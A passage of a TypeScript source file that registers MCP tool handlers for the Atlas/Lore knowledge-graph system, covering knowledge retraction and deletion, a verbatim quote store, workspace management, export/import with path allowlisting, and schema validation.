                workspace: { type: 'string', description: 'Lore workspace name.' },
                type: {
                    type: 'string',
                    enum: ['decision', 'convention', 'bug_pattern', 'troubleshooting', 'architecture'],
                    description: 'Restrict to one knowledge type. Omit for all knowledge types. Code nodes (code_file/code_symbol) are deliberately not listable here — use atlas_subgraph / atlas_fullgraph for the code graph.',
                },
                tag: { type: 'string', description: 'Keep only nodes carrying this exact tag (case-insensitive).' },
                limit: { type: 'integer', description: 'Page size. Default 50, max 500.' },
                offset: { type: 'integer', description: 'Rows to skip, for paging. Default 0.' },
                includeSuperseded: { type: 'boolean', description: 'Include superseded/retracted nodes (they carry supersededAt/supersededBy/supersededReason). Default false.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            if (cfg.lore.mode !== 'embedded') {
                // Needs the listNodes read surface only EmbeddedLore exposes
                // (mirrors knowledge_export_all / flag_unbacked_work).
                return { error: 'not_supported', tool: 'knowledge_list', detail: 'knowledge_list requires lore.mode=embedded' };
            }
            try {
                return await withEmbeddedLore(cfg, workspace, async (lore) => {
                    return await runKnowledgeList(lore, args as never, workspace);
                });
            } catch (err) {
                return sanitizedToolError('knowledge_list failed', err);
            }
        },
    });

    registry.register({
        name: 'flag_unbacked_work',
        description: 'Read-only developer-side flag reader: list work (decisions) in a workspace that has NO approved PM change request behind it — neither PM-authored nor edge-linked to an approved, non-superseded PM decision. FLAG, NEVER BLOCK. Project-level only; never per-person. Powers the Groundfloor Atlas UI "unbacked work" panel and mirrors the `atlas memory flag` CLI.',
        inputSchema: {
            type: 'object',
            properties: {
                workspace: { type: 'string', description: 'Lore workspace. Defaults to Atlas config workspace.' },
                includeSuperseded: { type: 'boolean', description: 'Include soft-superseded work nodes. Default false.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            if (cfg.lore.mode !== 'embedded') {
                // The read-only flag view is an embedded-mode feature (the daemon
                // path). A remote-Lore deployment would surface flags differently.
                return { ok: false, error: 'flag_unbacked_work requires embedded Lore mode' };
            }
            return withEmbeddedLore(cfg, workspace, async (lore) => {
                const view = await collectKnowledgeView(lore, workspace);
                const flags = flagUnbackedWork(view, {
                    includeSuperseded: args.includeSuperseded as boolean | undefined,
                });
                return {
                    ok: true,
                    workspace,
                    count: flags.length,
                    // Project/work-item level ONLY — no assignee/person field, by design.
                    flags: flags.map((f) => ({
                        id: f.node.id,
                        type: f.node.type,
                        label: f.node.label ?? '',
                        reason: f.reason,
                    })),
                };
            });
        },
    });

    registry.register({
        name: 'knowledge_retract',
        description: 'Soft-retract a knowledge node WITHOUT a replacement — the "this is wrong, forget it" path. The node stays in the graph with its history and edges intact, is hidden from default recall, and remains visible via includeSuperseded, exactly like a superseded node. Use this instead of knowledge_delete (permanent) whenever the intent is "stop telling me this", and instead of knowledge_supersede when there is nothing to supersede it WITH. Implemented by superseding the node to a per-workspace tombstone that Atlas creates on demand; callers never invent a placeholder node of their own.',
        inputSchema: {
            type: 'object',
            required: ['id', 'workspace'],
            properties: {
                id: { type: 'string', description: 'ID of the node to retract.' },
                reason: { type: 'string', description: 'Why it is being retracted. Recorded on the supersession — strongly recommended, since a retraction with no reason is indistinguishable from a mistake later.' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            const wsName = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            const targetId = args.id as string;
            const reason = (args.reason as string | undefined) ?? 'retracted (no replacement given)';
            if (cfg.lore.mode !== 'embedded') {
                return { error: 'knowledge_retract requires embedded mode (the default).' };
            }
            return withEmbeddedLore(cfg, wsName, async (lore) => {
                // ONE tombstone per workspace, created lazily. Superseding to a
                // per-retraction placeholder would litter the graph with junk
                // nodes that recall and exports would then have to filter; a
                // single shared sink keeps the "this was retracted" edge
                // meaningful and the node count honest. Lore rejects
                // self-supersession ({ok:false, reason:'self'}), which is why a
                // distinct target node is required at all.
                const tombstoneId = `knowledge:tombstone:${wsName}`;
                await lore.storeNode({
                    id: tombstoneId,
                    type: 'architecture',
                    workspace: wsName,
                    // embed:false — the tombstone must never surface in semantic
                    // recall. It is a graph anchor, not knowledge.
                    embed: false,
                    label: 'Retracted knowledge (tombstone)',
                    content: 'Sink node for retracted knowledge in this workspace. Nodes superseded BY this one were withdrawn without a replacement — they were wrong or no longer wanted, not replaced by something newer. Not knowledge itself; never cite it. Created and maintained by knowledge_retract.',
                    tags: 'atlas,tombstone,retracted,internal',
                } as never);
                const res = await lore.supersedeNode(targetId, tombstoneId, reason) as { ok?: boolean } | null;
                mirrorKnowledgeBackup(lore, wsName, cfg.home);
                if (res && res.ok === false) return { ...res, id: targetId, workspace: wsName };
                return { ok: true, retracted: true, id: targetId, tombstoneId, reason, workspace: wsName };
            });
        },
    });

    registry.register({
        name: 'knowledge_supersede',
        description: 'Soft-supersede an old knowledge node with a newer one. The old node stays in the graph (edges preserved, history intact) but is hidden from default recall. Use when a decision or architecture changes and you want a clear "this was before, this is now" trail. When there is NO replacement — "this is just wrong, forget it" — use knowledge_retract instead of inventing a placeholder node.',
        inputSchema: {
            type: 'object',
            required: ['oldId', 'newId', 'workspace'],
            properties: {
                oldId: { type: 'string', description: 'ID of the node being superseded.' },
                newId: { type: 'string', description: 'ID of the new node that replaces it.' },
                reason: { type: 'string', description: 'Optional human-readable reason for the supersession.' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode === 'embedded') {
                const supWs = (args.workspace as string | undefined) ?? cfg.lore.workspace;
                return withEmbeddedLore(cfg, supWs, async (lore) => {
                    const supRes = await lore.supersedeNode(args.oldId as string, args.newId as string, args.reason as string | undefined);
                    mirrorKnowledgeBackup(lore, supWs, cfg.home);
                    return supRes;
                });
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            return supersedeNode(lc.mcpUrl, lc.token, {
                oldId: args.oldId as string,
                newId: args.newId as string,
                reason: args.reason as string | undefined,
                workspace: (args.workspace as string | undefined) ?? lc.workspace,
            });
        },
    });

    registry.register({
        name: 'knowledge_delete',
        description: 'Hard-delete a knowledge node by id: removes it and all its edges from the graph and purges its vector/text row so it no longer surfaces in recall. Unlike knowledge_supersede (a reversible soft-tombstone that keeps history), this is permanent — use it only to purge stray/test nodes that should never have existed, not to record that a decision changed (use supersede for that). Returns { ok, deleted }; deleted:false means the id was already absent.',
        inputSchema: {
            type: 'object',
            required: ['id', 'workspace'],
            properties: {
                id: { type: 'string', description: 'ID of the node to delete outright.' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode !== 'embedded') {
                // No remote hard-delete client exists (and this machine runs no
                // remote daemon). Point the caller at the reversible alternative.
                return { error: 'not_supported', tool: 'knowledge_delete', detail: 'hard delete is embedded-mode only; use knowledge_supersede in remote mode' };
            }
            const delWs = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            return withEmbeddedLore(cfg, delWs, async (lore) => {
                const delRes = await lore.deleteNode(args.id as string);
                mirrorKnowledgeBackup(lore, delWs, cfg.home);
                return delRes;
            });
        },
    });

    // ── WO-2: Verbatim memory (append-only quote bank) ──────────────────────

    registry.register({
        name: 'verbatim_store',
        description: 'Queue a verbatim memory entry — raw, unmodified text (agent turn, doc excerpt, transcript quote) stored append-only under a deterministic id (sha256 of the text), so re-storing identical text is an idempotent upsert, never a duplicate. Content layout: "SOURCE:" and "AT:" header lines, then the byte-exact text (32KB cap; over-cap text is tail-truncated with a [truncated] marker). Returns {ok, queued, id} immediately — the write lands via a background bulk flush. These nodes are never edited or deleted by the verbatim tools; use knowledge_supersede semantics via knowledge_store_edge to mark one superseded.',
        inputSchema: {
            type: 'object',
            required: ['workspace', 'text', 'source'],
            properties: {
                workspace: { type: 'string', description: 'Lore workspace to store the entry in.' },
                text: { type: 'string', description: 'Raw text to preserve verbatim. Stored unmodified after the header lines (32KB cap).' },
                source: { type: 'string', description: 'Where the text came from, e.g. "session:<id>" or "doc:/absolute/path".' },
                timestamp: { type: 'string', description: 'ISO-8601 capture time. Default: now.' },
                topic: { type: 'string', description: 'Optional topic; entries sharing a topic tag are time-compared in verbatim_recall.' },
                sessionId: { type: 'string', description: 'Optional session id, kept in node metadata.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // The queue flushes through EmbeddedLore.bulkStoreNodes; in remote
            // mode entries could sit queued forever — refuse up front instead.
            if (cfg.lore.mode !== 'embedded') {
                return { error: 'verbatim_store requires lore.mode=embedded', detail: `current mode: ${cfg.lore.mode}` };
            }
            try {
                return runVerbatimStore({
                    workspace: args.workspace as string,
                    text: args.text as string,
                    source: args.source as string,
                    timestamp: args.timestamp as string | undefined,
                    topic: args.topic as string | undefined,
                    sessionId: args.sessionId as string | undefined,
                });
            } catch (err) {
                return sanitizedToolError('verbatim_store failed', err);
            }
        },
    });

    registry.register({
        name: 'verbatim_recall',
        description: 'Recall verbatim entries for a topic (semantic recall narrowed to verbatim-tagged nodes). Each hit is annotated with its standing against the rest of the result set: "superseded-by:<id>" when a newer hit supersedes it via a supersedes edge, "outdated-by:<id> (by time)" when a co-topic hit is strictly newer, else "current". Current hits lead (newest first), the rest follow by timestamp descending. Append-only: this tool never mutates stored entries.',
        inputSchema: {
            type: 'object',
            required: ['workspace', 'topic'],
            properties: {
                workspace: { type: 'string', description: 'Lore workspace to recall from.' },
                topic: { type: 'string', description: 'Free-text topic to recall against (e.g. "auth token rotation discussion").' },
                limit: { type: 'integer', description: 'Max entries to return. Default 10.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode !== 'embedded') {
                return { error: 'verbatim_recall requires lore.mode=embedded', detail: `current mode: ${cfg.lore.mode}` };
            }
            const workspace = args.workspace as string;
            try {
                return await withEmbeddedLore(cfg, workspace, async (lore) => {
                    return await runVerbatimRecall(lore, {
                        workspace,
                        topic: args.topic as string,
                        limit: args.limit as number | undefined,
                    });
                });
            } catch (err) {
                return sanitizedToolError('verbatim_recall failed', err);
            }
        },
    });

    registry.register({
        name: 'verbatim_import',
        description: 'Import files as verbatim entries (one per file, queued like verbatim_store). Every path is checked against the operator scan allowlist (the same one atlas_index enforces) BEFORE anything is read; a forbidden path rejects the whole call with a typed error. Timestamp = the first ISO-8601 date found in the file\'s first 20 lines, else the file mtime. Source = "doc:<absolute path>".',
        inputSchema: {
            type: 'object',
            required: ['workspace', 'files'],
            properties: {
                workspace: { type: 'string', description: 'Lore workspace to store the entries in.' },
                files: { type: 'array', items: { type: 'string' }, description: 'File paths to import verbatim.' },
                topic: { type: 'string', description: 'Optional topic stamped on every imported entry.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode !== 'embedded') {
                return { error: 'verbatim_import requires lore.mode=embedded', detail: `current mode: ${cfg.lore.mode}` };
            }
            try {
                return await runVerbatimImport({
                    workspace: args.workspace as string,
                    files: args.files as string[],
                    topic: args.topic as string | undefined,
                });
            } catch (err) {
                return sanitizedToolError('verbatim_import failed', err);
            }
        },
    });

    // ── Sprint 3: Workspace Tools ────────────────────────────────────────────

    registry.register({
        name: 'workspace_create',
        description: 'Create a new Lore workspace of type code_intelligence. Returns the new workspace ID. Use this once before indexing a project for the first time.',
        inputSchema: {
            type: 'object',
            required: ['name'],
            properties: {
                name: { type: 'string', description: 'Workspace name (slug-style, e.g. "my-project").' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // Embedded: a workspace IS its dataDir — there is no remote
            // workspace record to create. Scaffold (and validate) the dir so
            // the first index call lands in a known-good location.
            if (cfg.lore.mode === 'embedded') {
                try {
                    const dir = embeddedDataDir(cfg, args.name as string);
                    fs.mkdirSync(dir, { recursive: true });
                    invalidateWorkspaceResolverCache();
                    return { ok: true, embedded: true, workspace: args.name as string, dataDir: dir };
                } catch (err) {
                    return sanitizedToolError('workspace_create failed', err);
                }
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            try {
                return await createWorkspace(lc.mcpUrl, lc.token, args.name as string);
            } catch (err) {
                return sanitizedToolError('workspace_create failed', err);
            }
        },
    });

    registry.register({
        name: 'workspace_list',
        description: 'List all Lore workspaces accessible with the current auth token. Pass includeStats:true (embedded mode) to also return per-workspace KPIs (node/edge counts, type breakdown, projects, lastIndexed) read cheaply from each workspace\'s stats.json snapshot — this never opens a Kuzu store.',
        inputSchema: {
            type: 'object',
            properties: {
                includeStats: { type: 'boolean', description: 'Embedded mode only: also return per-workspace KPIs from each workspace\'s stats.json snapshot (falls back to the kuzu graph mtime for lastIndexed when no snapshot exists). Default false returns bare names.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // Embedded: each workspace is a subdir of the embedded base dir.
            // Enumerate those instead of querying a remote registry.
            if (cfg.lore.mode === 'embedded') {
                try {
                    const base = embeddedBaseDir(cfg);
                    const names = fs.existsSync(base)
                        ? fs.readdirSync(base, { withFileTypes: true })
                            .filter((d) => d.isDirectory())
                            .map((d) => d.name)
                        : [];
                    // KPI branch — build each workspace's entry as a PURE fs read of
                    // its stats.json (or the kuzu graph mtime fallback). NEVER opens
                    // a Kuzu store, so the MAX_OPEN LRU is untouched. Callers that
                    // pass no args (WorkspaceSwitcher, SettingsPage) keep the
                    // unchanged bare-names contract below.
                    if (args?.includeStats === true) {
                        const workspaces = names.map((name) =>
                            buildWorkspaceStatsEntry(name, embeddedDataDir(cfg, name)),
                        );
                        return { ok: true, embedded: true, workspaces };
                    }
                    return { ok: true, embedded: true, workspaces: names };
                } catch (err) {
                    return sanitizedToolError('workspace_list failed', err);
                }
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            try {
                return await listWorkspaces(lc.mcpUrl, lc.token);
            } catch (err) {
                return sanitizedToolError('workspace_list failed', err);
            }
        },
    });

    registry.register({
        name: 'workspace_add_project',
        description: 'Register an absolute project folder path in a Lore workspace. Indexing is triggered separately via atlas_index. Call this once per project root you want Atlas to track.',
        inputSchema: {
            type: 'object',
            required: ['workspace', 'path'],
            properties: {
                workspace: { type: 'string', description: 'Target workspace name.' },
                path: { type: 'string', description: 'Absolute path to the project folder.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // Audit ATL-004 — opt-in scan-path allowlist (no-op unless configured).
            const projErr = scanPathError(args.path as string);
            if (projErr) return { error: projErr };
            // Embedded: there is no remote project registry — a project is
            // tracked simply by indexing it into the workspace dataDir. Ensure
            // the workspace dir exists; the path is consumed later by
            // atlas_index, which owns the actual ingest.
            if (cfg.lore.mode === 'embedded') {
                const wsName = (args.workspace as string | undefined) ?? cfg.lore.workspace;
                const projPath = (args.path as string).trim();
                try {
                    const dir = embeddedDataDir(cfg, wsName);
                    fs.mkdirSync(dir, { recursive: true });
                    // Persist the project path in projects.json so workspace_list_projects can surface it.
                    const regFile = path.join(dir, 'projects.json');
                    let projects: { path: string; addedAt: string }[] = [];
                    if (fs.existsSync(regFile)) {
                        try { projects = JSON.parse(fs.readFileSync(regFile, 'utf8')); } catch { /* corrupt — reset */ }
                    }
                    if (!projects.some((p) => p.path === projPath)) {
                        projects.push({ path: projPath, addedAt: new Date().toISOString() });
                        fs.writeFileSync(regFile, JSON.stringify(projects, null, 2));
                    }
                    invalidateWorkspaceResolverCache();
                    return { ok: true, embedded: true, workspace: wsName, path: projPath };
                } catch (err) {
                    return sanitizedToolError('workspace_add_project failed', err);
                }
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            const wsName = (args.workspace as string | undefined) ?? lc.workspace;
            try {
                return await addWorkspaceProject(lc.mcpUrl, lc.token, wsName, args.path as string);
            } catch (err) {
                return sanitizedToolError('workspace_add_project failed', err);
            }
        },
    });

    registry.register({
        name: 'workspace_status',
        description: 'Get the health and statistics for a Lore workspace: node counts, last indexed timestamp, and indexer health.',
        inputSchema: {
            type: 'object',
            properties: {
                workspace: { type: 'string', description: 'Workspace name. Defaults to Atlas config workspace.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // Embedded: report dataDir existence + node/edge counts read from
            // the in-process store (no remote workspace-status endpoint).
            if (cfg.lore.mode === 'embedded') {
                const wsName = (args.workspace as string | undefined) ?? cfg.lore.workspace;
                try {
                    const dir = embeddedDataDir(cfg, wsName);
                    if (!fs.existsSync(dir)) {
                        return { ok: true, embedded: true, workspace: wsName, exists: false, dataDir: dir };
                    }
                    return withEmbeddedLore(cfg, wsName, async (lore) => {
                        // RD-status-oom — count via Cypher count(), NOT listNodes/
                        // listEdges (full materialization). A real-sized workspace
                        // (v3, 136MB graph) OOM-crashed the daemon outright when
                        // this used to fetch every node's full content + every
                        // edge just to read .length off the arrays.
                        //
                        // BUGFIX — call getStats() UNFILTERED. This used to pass
                        // `wsName` as the projectFilter, but node.project holds the
                        // INDEXED PROJECT name, not the workspace name (see
                        // EmbeddedLore.storeNode: project = workspace passed AT INDEX
                        // TIME, e.g. a repo slug — NOT the on-disk workspace dir name).
                        // Each workspace has its OWN store, so no filter is needed at
                        // all; filtering by the dir name matched zero rows and reported
                        // 0 counts for workspaces like "developer".
                        const stats = await lore.getStats();
                        // LAZY BACKFILL — persist the snapshot so the workspaces list
                        // can read this workspace's KPIs as a pure fs read next time.
                        // This is the one-time backfill path for pre-existing
                        // snapshot-less workspaces (those indexed before the snapshot
                        // feature). Best-effort: never fail a status read over it.
                        try {
                            await writeStatsSnapshot(lore, dir);
                        } catch (err) {
                            process.stderr.write(`[atlas] stats snapshot skipped: ${(err as Error).message}\n`);
                        }
                        return {
                            ok: true,
                            embedded: true,
                            workspace: wsName,
                            exists: true,
                            dataDir: dir,
                            nodeCount: stats.nodeCount,
                            edgeCount: stats.edgeCount,
                            typeBreakdown: stats.typeBreakdown,
                        };
                    });
                } catch (err) {
                    return sanitizedToolError('workspace_status failed', err);
                }
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            const wsName = (args.workspace as string | undefined) ?? lc.workspace;
            try {
                return await getWorkspaceStatus(lc.mcpUrl, lc.token, wsName);
            } catch (err) {
                return sanitizedToolError('workspace_status failed', err);
            }
        },
    });

    registry.register({
        name: 'workspace_list_projects',
        description: 'List all project folders registered in a workspace.',
        inputSchema: {
            type: 'object',
            properties: {
                workspace: { type: 'string', description: 'Workspace name.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode === 'embedded') {
                const wsName = (args.workspace as string | undefined) ?? cfg.lore.workspace;
                try {
                    const dir = embeddedDataDir(cfg, wsName);
                    const regFile = path.join(dir, 'projects.json');
                    if (!fs.existsSync(regFile)) return { ok: true, workspace: wsName, projects: [] };
                    const projects = JSON.parse(fs.readFileSync(regFile, 'utf8'));
                    return { ok: true, workspace: wsName, projects };
                } catch (err) {
                    return sanitizedToolError('workspace_list_projects failed', err);
                }
            }
            return { error: 'workspace_list_projects not supported in remote mode' };
        },
    });

    registry.register({
        name: 'workspace_remove_project',
        description: 'Remove a project folder from a workspace registry. Does not delete indexed data from the graph.',
        inputSchema: {
            type: 'object',
            required: ['workspace', 'path'],
            properties: {
                workspace: { type: 'string', description: 'Workspace name.' },
                path: { type: 'string', description: 'Absolute path of the project to remove.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode === 'embedded') {
                const wsName = (args.workspace as string | undefined) ?? cfg.lore.workspace;
                const projPath = (args.path as string).trim();
                try {
                    const dir = embeddedDataDir(cfg, wsName);
                    const regFile = path.join(dir, 'projects.json');
                    if (!fs.existsSync(regFile)) return { ok: true, workspace: wsName, removed: false };
                    let projects: { path: string; addedAt: string }[] = JSON.parse(fs.readFileSync(regFile, 'utf8'));
                    const before = projects.length;
                    projects = projects.filter((p) => p.path !== projPath);
                    fs.writeFileSync(regFile, JSON.stringify(projects, null, 2));
                    invalidateWorkspaceResolverCache();
                    return { ok: true, workspace: wsName, removed: before !== projects.length, remaining: projects.length };
                } catch (err) {
                    return sanitizedToolError('workspace_remove_project failed', err);
                }
            }
            return { error: 'workspace_remove_project not supported in remote mode' };
        },
    });

    registry.register({
        name: 'workspace_delete',
        description: 'Permanently delete a Lore workspace and all its indexed data. This is irreversible. A knowledge snapshot is taken automatically before deletion (see knowledgeBackupPath in the response) — restore it with `atlas memory import <path>` into a fresh workspace if the delete turns out to be a mistake.',
        inputSchema: {
            type: 'object',
            required: ['workspace'],
            properties: {
                workspace: { type: 'string', description: 'Workspace name to delete.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode === 'embedded') {
                const wsName = args.workspace as string;
                try {
                    const dir = embeddedDataDir(cfg, wsName);
                    if (!fs.existsSync(dir)) return { ok: true, embedded: true, deleted: false, workspace: wsName, reason: 'not_found' };

                    // RD-wipe-guard — a debounced mirror can miss the final seconds
                    // before a wipe (or never have fired for a workspace nobody wrote
                    // to through Atlas, e.g. one restored/inspected by hand). Take one
                    // FINAL synchronous, blocking snapshot right before rmSync so a
                    // destructive delete can never outrun its own backup. This is the
                    // guard that was missing when a v3 wipe silently destroyed another
                    // agent's knowledge nodes with no recovery path.
                    const safe = wsName.replace(/[^A-Za-z0-9._-]+/g, '_') || 'default';
                    const backupPath = path.join(cfg.home, 'knowledge-backups', `${safe}.pre-delete.jsonl`);
                    const timer = _knowledgeBackupTimers.get(wsName);
                    if (timer) { clearTimeout(timer); _knowledgeBackupTimers.delete(wsName); }
                    await withEmbeddedLore(cfg, wsName, async (lore) => {
                        await exportMemory(lore as never, wsName, backupPath).catch((err) => {
                            // A failed snapshot must NOT silently permit the wipe — an
                            // operator who asked for a safety net deserves a loud failure,
                            // not a wipe that proceeds as if nothing was wrong.
                            throw new Error(`pre-delete knowledge backup failed, aborting delete: ${(err as Error).message}`);
                        });
                    });

                    // GHOST-HANDLE FIX — the wipe-guard above protects the OLD
                    // data; this protects NEW writes. The registry caches the
                    // open handle keyed by dataDir: rmSync without evicting it
                    // leaves a live instance whose Kuzu/LanceDB/SQLite files are
                    // unlinked — later writes vanish into the void, and
                    // re-creating the workspace would keep serving the ghost.
                    await closeEmbeddedLore(cfg, wsName);

                    fs.rmSync(dir, { recursive: true, force: true });
                    invalidateWorkspaceResolverCache();
                    return { ok: true, embedded: true, deleted: true, workspace: wsName, knowledgeBackupPath: backupPath };
                } catch (err) {
                    return sanitizedToolError('workspace_delete failed', err);
                }
            }
            return { error: 'workspace_delete not supported in remote mode' };
        },
    });

    registry.register({
        name: 'knowledge_export_all',
        description: 'Export every knowledge node + edge in a workspace to a JSONL file, for the daemon to write directly (in-process, using its already-open Lore handle). Exists so a SEPARATE CLI process (e.g. the `atlas hook install` pre-commit hook, or `atlas memory export`) never has to open its own competing Kuzu connection when the daemon is already running — Kuzu is single-writer, so a second process opening the same workspace while the daemon holds it fails with a lock error. Callers should try this over the daemon\'s /mcp endpoint first and only fall back to a direct embedded open when the daemon is unreachable.',
        inputSchema: {
            type: 'object',
            required: ['workspace', 'outPath'],
            properties: {
                workspace: { type: 'string' },
                outPath: { type: 'string', description: 'Absolute path to write the JSONL export to (the daemon\'s cwd differs from the caller\'s, so this must be absolute, not project-relative).' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode !== 'embedded') {
                return { error: 'not_supported', tool: 'knowledge_export_all', detail: 'export via daemon is embedded-mode only' };
            }
            const wsName = args.workspace as string;
            const outPath = args.outPath as string;
            if (!path.isAbsolute(outPath)) {
                return { error: 'invalid_arguments', tool: 'knowledge_export_all', detail: 'outPath must be an absolute path' };
            }
            // RC security — a caller-supplied absolute path was written with no
            // containment: an MCP caller could exfiltrate/overwrite any file the
            // daemon's user can write (e.g. ~/.ssh/authorized_keys). When the
            // operator has configured a scan-path allowlist (ATLAS_INDEX_ROOTS /
            // config.index.roots), confine the export target to it; escapes and
            // '..' traversal are refused. Permissive (no allowlist) is unchanged.
            const outErr = scanPathError(outPath);
            if (outErr) {
                return { error: 'path_forbidden', tool: 'knowledge_export_all', detail: outErr };
            }
            try {
                return await withEmbeddedLore(cfg, wsName, async (lore) => {
                    const r = await exportMemory(lore as never, wsName, outPath);
                    return { ok: true, workspace: wsName, path: r.path, nodeCount: r.nodeCount, edgeCount: r.edgeCount, bytes: r.bytes };
                });
            } catch (err) {
                return sanitizedToolError('knowledge_export_all failed', err);
            }
        },
    });

    registry.register({
        name: 'knowledge_import_all',
        description: 'Import a JSONL knowledge export into a workspace, for the daemon to do in-process (using its already-open Lore handle). Mirrors knowledge_export_all\'s reason for existing: a SEPARATE CLI process (e.g. the `atlas wire`-installed post-merge/post-checkout git hook, or `atlas memory import`) must not open its own competing Kuzu connection when the daemon already has this workspace open.',
        inputSchema: {
            type: 'object',
            required: ['workspace', 'inPath'],
            properties: {
                workspace: { type: 'string' },
                inPath: { type: 'string', description: 'Absolute path to the JSONL file to import (the daemon\'s cwd differs from the caller\'s, so this must be absolute, not project-relative).' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode !== 'embedded') {
                return { error: 'not_supported', tool: 'knowledge_import_all', detail: 'import via daemon is embedded-mode only' };
            }
            const wsName = args.workspace as string;
            const inPath = args.inPath as string;
            if (!path.isAbsolute(inPath)) {
                return { error: 'invalid_arguments', tool: 'knowledge_import_all', detail: 'inPath must be an absolute path' };
            }
            // RC security — mirror knowledge_export_all: confine the caller-
            // supplied read path to the operator's scan-path allowlist when set,
            // so an MCP caller can't coax the daemon into reading arbitrary files.
            const inErr = scanPathError(inPath);
            if (inErr) {
                return { error: 'path_forbidden', tool: 'knowledge_import_all', detail: inErr };
            }
            try {
                return await withEmbeddedLore(cfg, wsName, async (lore) => {
                    const r = await importMemory(lore as never, wsName, inPath);
                    mirrorKnowledgeBackup(lore, wsName, cfg.home);
                    return { ok: r.errors.length === 0, workspace: wsName, nodeCount: r.nodeCount, edgeCount: r.edgeCount, skipped: r.skipped, errorCount: r.errors.length, firstErrors: r.errors.slice(0, 3) };
                });
            } catch (err) {
                return sanitizedToolError('knowledge_import_all failed', err);
            }
        },
    });

    registry.register({
        name: 'workspace_rename',
        description: 'Rename a Lore workspace. The new name must be a valid slug (lowercase letters, numbers, hyphens).',
        inputSchema: {
            type: 'object',
            required: ['workspace', 'newName'],
            properties: {
                workspace: { type: 'string', description: 'Current workspace name.' },
                newName: { type: 'string', description: 'New workspace name (slug-style, e.g. "my-project").' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode === 'embedded') {
                const oldName = args.workspace as string;
                const newName = args.newName as string;
                if (!/^[a-z0-9][a-z0-9-]*$/.test(newName)) {
                    return { error: 'invalid_name: use lowercase letters, numbers, and hyphens only' };
                }
                try {
                    const base = embeddedBaseDir(cfg);
                    const oldDir = embeddedDataDir(cfg, oldName);
                    const newDir = embeddedDataDir(cfg, newName);
                    if (!fs.existsSync(oldDir)) return { error: `workspace "${oldName}" not found` };
                    if (fs.existsSync(newDir)) return { error: `workspace "${newName}" already exists` };
                    // GHOST-HANDLE FIX — close + evict BOTH registry entries
                    // before the rename: the old key would keep serving a live
                    // handle whose files just moved (and double-open the store
                    // when the new name is first used); the new key could hold
                    // a stale ghost from an earlier delete under that name.
                    await closeEmbeddedLore(cfg, oldName);
                    await closeEmbeddedLore(cfg, newName);
                    fs.renameSync(oldDir, newDir);
                    return { ok: true, embedded: true, renamed: true, from: oldName, to: newName };
                } catch (err) {
                    return sanitizedToolError('workspace_rename failed', err);
                }
            }
            return { error: 'workspace_rename not supported in remote mode' };
        },
    });

    // ── Sprint 3: Schema Validation Tools ────────────────────────────────────

    registry.register({
        name: 'schema_validate',
        description: 'Run schema drift analysis and blast-radius impact assessment for a schema change. Takes a schema file and optional repo root; returns a combined {drift, impact} object. Use before applying a migration to understand what breaks.',
        inputSchema: {
            type: 'object',
            required: ['schemaFile'],
            properties: {
                schemaFile: { type: 'string', description: 'Path to the live dump / modified schema file.' },
                repoRoot: { type: 'string', description: 'Repo root for file discovery and blast-radius traversal. Defaults to cwd.' },
                symbol: { type: 'string', description: 'Schema symbol to assess blast radius for (e.g. a table name or type). Required for impact analysis.' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const __r = resolveCodeReader();
            if ('error' in __r) return __r.error;
            const reader = __r.reader;
            const workspace = (args.workspace as string | undefined) ?? __r.workspace;

            const [drift, impact] = await Promise.allSettled([
                runSchemaDriftTool(reader, {
                    schemaFile: args.schemaFile as string,
                    repoRoot: args.repoRoot as string | undefined,
                    workspace,
                }),
                args.symbol
                    ? runBlastRadius(reader, {
                        symbol: args.symbol as string,
                        workspace,
                    }, workspace)
                    : Promise.resolve(null),
            ]);

            return {
                drift: drift.status === 'fulfilled' ? drift.value : { error: drift.reason?.message ?? String(drift.reason) },
                impact: impact.status === 'fulfilled' ? impact.value : { error: impact.reason?.message ?? String(impact.reason) },
            };
        },
    });

    registry.register({
        name: 'schema_confirm',
        description: 'Confirm a schema change by writing a decision knowledge node to Lore. Records the schema change, the file affected, and the rationale so future engineers can recall why the migration was made.',
        inputSchema: {
            type: 'object',
            required: ['label', 'content', 'schemaFile'],
            properties: {
                label: { type: 'string', description: 'Short title for the decision (e.g. "Add user_sessions table").' },
                content: { type: 'string', description: 'Full rationale — the WHY. Include trade-offs considered and migration plan.' },
                schemaFile: { type: 'string', description: 'Path to the schema file this decision applies to.' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            const content = `Schema change confirmed for ${args.schemaFile as string}:\n\n${args.content as string}`;
